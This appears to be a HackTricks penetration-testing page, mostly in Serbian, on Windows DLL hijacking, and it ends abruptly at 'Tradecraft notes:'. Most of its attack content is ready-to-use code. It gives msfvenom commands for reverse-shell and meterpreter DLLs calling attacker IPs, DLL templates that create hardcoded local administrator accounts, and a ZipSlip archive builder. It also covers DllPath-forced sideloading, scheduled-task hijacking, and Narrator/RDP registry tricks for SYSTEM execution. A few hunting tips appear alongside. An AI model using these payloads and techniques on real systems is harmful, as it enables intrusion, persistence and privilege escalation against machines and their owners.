# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking podrazumeva manipulaciju trusted aplikacije tako da učita malicious DLL. Ovaj termin obuhvata više taktika kao što su **DLL Spoofing, Injection, and Side-Loading**. Najčešće se koristi za code execution, postizanje persistence, i ređe, privilege escalation. Iako je ovde fokus na escalation, metoda hijacking-a ostaje ista bez obzira na cilj.

### Common Techniques

Za DLL hijacking se koristi nekoliko metoda, a svaka ima svoju efikasnost u zavisnosti od načina na koji aplikacija učitava DLL:

1. **DLL Replacement**: Zamena legitimnog DLL-a malicious DLL-om, opciono uz DLL Proxying da bi se sačuvala funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje malicious DLL-a u search path ispred legitimnog, iskorišćavajući aplikacijin search pattern.
3. **Phantom DLL Hijacking**: Kreiranje malicious DLL-a koji će aplikacija učitati, misleći da je to nepostojeći obavezni DLL.
4. **DLL Redirection**: Izmena search parametara kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` fajlovi kako bi se aplikacija usmerila na malicious DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a malicious odgovarajućim u WinSxS direktorijumu, metod koji se često povezuje sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje malicious DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading nije jedini način da se trusted **.NET Framework** proces natera da učita attacker code. Ako je target executable **managed** aplikacija, CLR takođe proverava **application configuration file** koji nosi naziv kao izvršni fajl (na primer `Setup.exe.config`). Taj fajl može da definiše custom **AppDomainManager**. Ako config pokazuje na attacker-controlled assembly postavljen pored EXE-a, CLR ga učitava **pre normalne putanje koda aplikacije** i izvršava se unutar trusted procesa.

Prema Microsoft .NET Framework configuration schema, i `<appDomainManagerAssembly>` i `<appDomainManagerType>` moraju biti prisutni da bi se koristio custom manager.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalni manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Zavisi od CLR parsing-a konfiguracije, ne od Win32 DLL search order.
- Host mora zaista da bude **managed EXE**. Brza provera: `sigcheck -m target.exe`, `corflags target.exe`, ili proveri **CLR Runtime Header** u PE metadata.
- Ime config fajla mora tačno da se poklapa sa imenom izvršnog fajla (`<binary>.config`) i obično se nalazi **pored EXE**.
- Ovo je korisno sa **signed Microsoft/vendor binaries** zato što trusted EXE ostaje nepromenjen, dok malicious managed assembly izvršava in-process.
- Ako već imaš writable installer/update directory, AppDomainManager hijacking može da se koristi kao **prva faza**, a zatim classic DLL sideloading ili reflective loading za kasnije faze.

### Hijacking postojećeg scheduled task-a da bi se ponovo pokrenuo sideload chain

Za persistence, ne traži samo **kreiranje novog task-a**. Neke intrusion set-ove čekaju da legitiman installer kreira **normalan updater task**, pa zatim **prepišu action task-a** tako da postojeći name, author i trigger ostanu poznati defenderima.

Reusable workflow:
1. Instaliraj/pokreni legitimni software i identifikuj task koji normalno kreira.
2. Exportuj task XML i zabeleži trenutne `<Exec><Command>` / `<Arguments>` vrednosti.
3. Zameni samo action tako da task pokrene tvoj **trusted host EXE** iz user-writable staging directory, koji zatim side-load-uje ili AppDomain-load-uje pravi payload.
4. Ponovo registruj isti task name umesto da kreiraš novi, očigledan persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Zašto je stealthier:
- Ime taska i dalje može delovati legitimno (na primer vendor updater).
- **Task Scheduler service** ga pokreće, pa parent/ancestor validation često vidi očekivani scheduling chain umesto `explorer.exe`.
- DFIR timovi koji traže samo **nova imena taskova** mogu propustiti task čija registracija već postoji, ali čija action sada pokazuje na `%LOCALAPPDATA%`, `%APPDATA%`, ili drugi attacker-controlled path.

Brzi hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite `C:\Windows\System32\Tasks\*` XML i `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata sa baseline-om.
- Alertujte kada **vendor-looking updater task** izvršava iz **user-writable directories** ili pokreće .NET EXE sa pratećim `*.config` fajlom.

> [!TIP]
> Za step-by-step chain koji layer-uje HTML staging, AES-CTR configs, i .NET implants preko DLL sideloading, pogledajte workflow ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Najčešći način da se pronađu missing Dlls u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, **postavljanjem** **sledeća 2 filtera**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

i prikazati samo **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Ako tražite **missing dlls generalno** ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **missing dll unutar određenog executable-a** treba da postavite **još jedan filter kao "Process Name" "contains" `<exec name>`, pokrenete ga, i zaustavite snimanje events**.

## Exploiting Missing Dlls

Da bismo eskalirali privileges, najbolja šansa je da možemo da **upišemo dll koji će privilege process pokušati da učita** na nekom od **mesta gde će ga tražiti**. Zato ćemo moći da **upišemo** dll u **folder** gde se **dll traži pre** foldera gde se nalazi **original dll** (weird case), ili ćemo moći da **upišemo u neki folder gde će dll biti tražen** a originalni **dll ne postoji** ni u jednom folderu.

### Dll Search Order

**Unutar** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se Dlls konkretno učitavaju.**

**Windows applications** traže DLLs prateći skup **pre-defined search paths**, po određenom redosledu. Problem DLL hijacking-a nastaje kada se malicious DLL strateški postavi u jedan od tih direktorijuma, čime se obezbeđuje da se učita pre autentničnog DLL-a. Rešenje da se ovo spreči je da aplikacija koristi absolute paths kada referencira DLLs koje joj trebaju.

Možete videti **DLL search order on 32-bit** systems ispod:

1. Direktorijum iz kog je aplikacija učitana.
2. System directory. Koristite [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funkciju da dobijete path ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bit system directory. Ne postoji funkcija koja dobija path ovog direktorijuma, ali se pretražuje. (_C:\Windows\System_)
4. Windows directory. Koristite [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funkciju da dobijete path ovog direktorijuma.
1. (_C:\Windows_)
5. Current directory.
6. Direktorijumi navedeni u PATH environment variable. Imajte na umu da ovo ne uključuje per-application path definisan preko **App Paths** registry key. **App Paths** key se ne koristi pri računanju DLL search path-a.

To je **default** search order sa uključenim **SafeDllSearchMode**. Kada je isključen, current directory se pomera na drugo mesto. Da biste isključili ovu funkciju, kreirajte registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite ga na 0 (default je enabled).

Ako se [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funkcija pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH** pretraga počinje u direktorijumu executable modula koji **LoadLibraryEx** učitava.

Na kraju, imajte na umu da se **dll može učitati tako što se navede absolute path umesto samo imena**. U tom slučaju će se taj dll **tražiti samo na toj putanji** (ako dll ima zavisnosti, one će biti tražene kao da su tek učitane po imenu).

Postoje i drugi načini da se izmeni redosled pretrage, ali ih ovde neću objašnjavati.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Koristite **ProcMon** filtere (`Process Name` = target EXE, `Path` završava na `.dll`, `Result` = `NAME NOT FOUND`) da prikupite DLL names koje process proverava, ali ne može da pronađe.
2. Ako binary radi po **schedule/service**, ubacivanje DLL-a sa jednim od tih imena u **application directory** (search-order entry #1) biće učitano pri sledećem pokretanju. U jednom .NET scanner slučaju proces je tražio `hostfxr.dll` u `C:\samples\app\` pre nego što je učitao pravi copy iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite payload DLL (npr. reverse shell) sa bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaša primitive **ZipSlip-style arbitrary write**, napravite ZIP čiji entry izlazi iz extraction dir-a tako da DLL završi u app folder-u:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostavite arhivu u nadgledani inbox/share; kada zakazani zadatak ponovo pokrene proces, on učitava zlonamerni DLL i izvršava vaš kod kao service account.

### Forsiranje sideloading-a preko RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novokreiranog procesa jeste da postavite polje DllPath u RTL_USER_PROCESS_PARAMETERS kada kreirate proces pomoću ntdll native API-ja. Ako ovde navedete direktorijum pod kontrolom napadača, ciljni proces koji razrešava importovani DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flagova) može biti primoran da učita zlonamerni DLL iz tog direktorijuma.

Ključna ideja
- Napravite process parameters sa RtlCreateProcessParametersEx i navedite custom DllPath koji pokazuje na vaš kontrolisani folder (npr. direktorijum gde se nalazi vaš dropper/unpacker).
- Kreirajte proces sa RtlCreateUserProcess. Kada ciljni binarni fajl razrešava DLL po imenu, loader će tokom razrešavanja konsultovati ovaj navedeni DllPath, što omogućava pouzdano sideloading čak i kada zlonamerni DLL nije u istom direktorijumu kao target EXE.

Napomene/ograničenja
- Ovo utiče na child process koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Cilj mora da importuje ili LoadLibrary DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardcodovane apsolutne putanje ne mogu se hijack-ovati. Forwarded exports i SxS mogu promeniti prioritet.

Minimalni C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Potpuni C primer: forsiranje DLL sideloading-a preko RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Primer upotrebe u praksi
- Postavite zlonamerni xmllite.dll (koji eksportuje potrebne funkcije ili proxy-uje stvarni) u svoj DllPath direktorijum.
- Pokrenite signed binary za koji je poznato da traži xmllite.dll po imenu koristeći gornju tehniku. Loader rešava import preko prosleđenog DllPath i sideloads vaš DLL.

Ova tehnika je primećena in-the-wild kao pogon za više-stepene sideloading lance: početni launcher ispušta pomoćni DLL, koji zatim pokreće Microsoft-signed, hijackable binary sa prilagođenim DllPath da bi prisilio učitavanje napadačevog DLL-a iz staging direktorijuma.


#### Exceptions on dll search order from Windows docs

Određeni izuzeci od standardnog redosleda pretrage DLL-ova navedeni su u Windows dokumentaciji:

- Kada se naiđe na **DLL koji deli ime sa onim koji je već učitan u memoriju**, sistem zaobilazi uobičajenu pretragu. Umesto toga, prvo proverava redirekciju i manifest, a zatim po potrebi koristi DLL koji je već u memoriji. **U ovom scenariju sistem ne vrši pretragu za DLL-om**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za trenutnu Windows verziju, sistem će koristiti svoju verziju known DLL-a, zajedno sa svim njegovim zavisnim DLL-ovima, **bez izvršavanja procesa pretrage**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga za tim zavisnim DLL-ovima obavlja se kao da su navedeni samo svojim **module names**, bez obzira na to da li je početni DLL identifikovan kroz punu putanju.

### Escalating Privileges

**Requirements**:

- Identifikujte proces koji radi ili će raditi pod **different privileges** (horizontal or lateral movement), a kojem **nedostaje DLL**.
- Obezbedite **write access** za bilo koji **directory** u kome će se **DLL** **tražiti**. Ova lokacija može biti direktorijum izvršne datoteke ili direktorijum unutar system path.

Da, uslovi su komplikovani za pronalaženje, jer je **by default prilično čudno pronaći privilegovanu izvršnu datoteku kojoj nedostaje dll**, a još je **čudnije imati write permissions na folderu u system path-u** (to ne možete by default). Ali, u pogrešno konfigurisanom okruženju ovo je moguće.\
Ako imate sreće i ispunjavate uslove, možete pogledati [UACME](https://github.com/hfiref0x/UACME) projekat. Iako je **main goal projekta bypass UAC**, tamo možete naći **PoC** za Dll hijaking za Windows verziju koji možete da koristite (verovatno samo menjajući putanju foldera u kome imate write permissions).

Imajte na umu da možete **proveriti svoje permissions u folderu** tako što ćete:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih foldera unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti import-e jednog izvršnog fajla i export-e jednog dll-a sa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič o tome kako da **abuse Dll Hijacking to escalate privileges** sa dozvolama za upis u folder u **System Path** pogledaj:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)će proveriti da li imaš write permissions na bilo kom folderu unutar system PATH.\
Druge zanimljive automated tools za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Example

U slučaju da pronađeš exploitable scenario, jedna od najvažnijih stvari za uspešan exploit bila bi da **napraviš dll koji exportuje bar sve funkcije koje će executable importovati iz njega**. Ipak, imaj na umu da Dll Hijacking može biti koristan za [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Možeš pronaći primer **kako da napraviš valid dll** u okviru ove studije o dll hijacking-u fokusirane na dll hijacking za execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **sledećem odeljku** možeš pronaći neke **basic dll codes** koji mogu biti korisni kao **templates** ili za kreiranje **dll sa exported non required functions**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Osnovno, **Dll proxy** je Dll sposoban da **execute your malicious code when loaded** ali i da **expose** i **work** kao što se **expected** tako što **relay all the calls to the real library**.

Sa alatom [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) zapravo možeš da **indicate an executable and select the library** koju želiš da proxify i da **generate a proxified dll** ili da **indicate the Dll** i **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobij meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86 nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaše

Napomena da u nekoliko slučajeva Dll koji kompajlirate mora da **izveze nekoliko funkcija** koje će biti učitane od strane procesа žrtve; ako te funkcije ne postoje, **binarka neće moći da ih učita** i **exploit će pasti**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje pri startovanju proverava predvidljiv, jezički specifičan localization DLL koji se može hijack-ovati za arbitrary code execution i persistence.

Ključne činjenice
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako postoji writable attacker-controlled DLL na OneCore putanji, on se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Nisu potrebni exports.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja gore navedene putanje.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC tišina
- Naivan hijack će govoriti/istaknuti UI. Da bi ostao tih, pri attach-u enumeriši Narrator thread-ove, otvori glavni thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i `SuspendThread` ga; nastavi u svom thread-u. Pogledaj PoC za kompletan code.

Trigger i persistence putem Accessibility konfiguracije
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa gore navedenim, pokretanje Narrator-a učitava planted DLL. Na secure desktop-u (logon screen), pritisni CTRL+WIN+ENTER da pokreneš Narrator; tvoj DLL se izvršava kao SYSTEM na secure desktop-u.

RDP-triggered SYSTEM execution (lateral movement)
- Dozvoli classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP-uj na host, na logon screen-u pritisni CTRL+WIN+ENTER da pokreneš Narrator; tvoj DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje prestaje kada se RDP session zatvori—inject/migrate odmah.

Bring Your Own Accessibility (BYOA)
- Možeš klonirati ugrađeni Accessibility Tool (AT) registry entry (npr. CursorIndicator), izmeniti ga da pokazuje na proizvoljni binary/DLL, importovati ga, a zatim postaviti `configuration` na to AT ime. Ovo proksira proizvoljno izvršavanje kroz Accessibility framework.

Notes
- Pisanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva admin rights.
- Sva payload logika može da bude u `DLL_PROCESS_ATTACH`; exports nisu potrebni.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj primer pokazuje **Phantom DLL Hijacking** u Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), praćen kao **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se pokreće svakog dana u 9:30 AM pod kontekstom prijavljenog korisnika.
- **Directory Permissions**: Upisiv od strane `CREATOR OWNER`, što omogućava lokalnim korisnicima da ubace proizvoljne fajlove.
- **DLL Search Behavior**: Pokušava da učita `hostfxr.dll` iz svog working directory prvo i beleži "NAME NOT FOUND" ako nedostaje, što ukazuje na prioritet lokalne direktorijumske pretrage.

### Exploit Implementation

Napadač može postaviti malicious `hostfxr.dll` stub u isti direktorijum, iskorišćavajući nedostajući DLL da bi dobio code execution pod kontekstom korisnika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Kao standard user, ubaci `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekaj da scheduled task pokrene u 9:30 AM pod kontekstom trenutnog korisnika.
3. Ako je administrator prijavljen kada se task izvrši, malicious DLL se pokreće u administratorovoj session sa medium integrity.
4. Spoji standard UAC bypass tehnike da bi se podigao sa medium integrity na SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors često kombinuju MSI-based droppers sa DLL side-loading kako bi izvršili payload pod trusted, signed process.

Pregled chain-a
- User preuzima MSI. CustomAction se tiho pokreće tokom GUI install-a (npr. LaunchApplication ili VBScript action), rekonstruišući sledeću fazu iz embedded resources.
- Dropper upisuje legitimni, signed EXE i malicious DLL u isti direktorijum (primer: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se signed EXE pokrene, Windows DLL search order učitava wsc.dll iz working directory prvo, izvršavajući attacker code pod signed parent (ATT&CK T1574.001).

MSI analiza (na šta da obratiš pažnju)
- CustomAction table:
- Traži unose koji pokreću executables ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji izvršava embedded file u background.
- U Orca (Microsoft Orca.exe), pregledaj CustomAction, InstallExecuteSequence i Binary tables.
- Embedded/split payloads u MSI CAB:
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- Ili koristi lessmsi: `lessmsi x package.msi C:\out`
- Traži više malih fragmenata koji se konkateniraju i dešifruju pomoću VBScript CustomAction. Uobičajen flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktično sideloading sa wsc_proxy.exe
- Ubaci ove dve datoteke u isti folder:
- wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: attacker DLL. Ako nisu potrebni posebni exports, DllMain može biti dovoljan; u suprotnom, napravi proxy DLL i prosledi potrebne exports na pravu biblioteku dok payload pokrećeš u DllMain.
- Napravi minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za export zahteve, koristi proxying framework (npr. DLLirant/Spartacus) da generišeš forwarding DLL koji takođe izvršava tvoj payload.

- Ova tehnika se oslanja na DLL name resolution od strane host binary. Ako host koristi absolute paths ili safe loading flags (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može fail.
- KnownDLLs, SxS, i forwarded exports mogu uticati na precedence i moraju se uzeti u obzir tokom selection of the host binary i export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point je opisao kako Ink Dragon deployuje ShadowPad koristeći **three-file triad** da se uklopi u legitimate software, dok core payload ostaje encrypted na disku:

1. **Signed host EXE** – vendori kao što su AMD, Realtek, ili NVIDIA se abuse (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attacker-i rename-uju executable da liči na Windows binary (na primer `conhost.exe`), ali Authenticode signature ostaje valid.
2. **Malicious loader DLL** – drop-ovan pored EXE sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binary obfuscated sa ScatterBrain framework; njegov jedini posao je da locira encrypted blob, decrypt-uje ga, i reflectively map-uje ShadowPad.
3. **Encrypted payload blob** – često stored kao `<name>.tmp` u istom directory. Nakon memory-mapping decrypted payload-a, loader briše TMP file da uništi forensic evidence.

Tradecraft notes:

